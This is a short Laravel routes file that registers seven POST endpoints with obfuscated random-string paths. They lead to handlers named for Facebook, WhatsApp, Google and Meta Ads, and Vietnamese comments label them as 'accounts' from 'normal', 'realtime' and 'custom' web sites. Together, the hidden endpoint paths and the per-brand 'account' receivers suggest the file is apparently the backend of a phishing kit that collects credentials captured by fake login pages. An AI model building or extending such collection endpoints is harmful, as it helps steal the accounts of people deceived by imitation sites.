<?php

use App\Http\Controllers\CustomWeb;
use App\Http\Controllers\NormalWeb;
use App\Http\Controllers\RealtimeWeb;
use Illuminate\Support\Facades\Route;

// Acc của web thường
Route::post('2k2v23d343k4h4x3n3lo3n2w3kmrhbjfe', [NormalWeb::class, 'post'])->name('post.normalweb');
// Acc web realtime
Route::post('8c6v7f9d6f54w5w6gg5555rn4trhjntrfe', [RealtimeWeb::class, 'facebook_post'])->name('post.realtimeweb.facebook');
Route::post('2n34b4v4jn4h4c4n4k34lk4v4x3k23o32ui3gh3f', [RealtimeWeb::class, 'whatsapp_post'])->name('post.realtimeweb.whatsapp');
Route::post('1v4j78jk8b3c2nybv8cd5432hjtyiovyuw53tuji', [RealtimeWeb::class, 'google_post'])->name('post.realtimeweb.google');
// acc custom web
Route::post('t489u5tefyu8i9obfctgdvxkhjnu34r5tw0', [CustomWeb::class, 'facebook_post'])->name('post.customweb.facebook');
Route::post('hbujik4r35thui4r3tgvyu4rfwyhbigurfe', [CustomWeb::class, 'whatsapp_post'])->name('post.customweb.whatsapp');

// METAADS CUSTOM THEME
Route::post('2ntrjk7i38rf0bgfjnkwerfuyg34rt5tg90', [CustomWeb::class, 'metaads_post'])->name('post.customweb.metaads');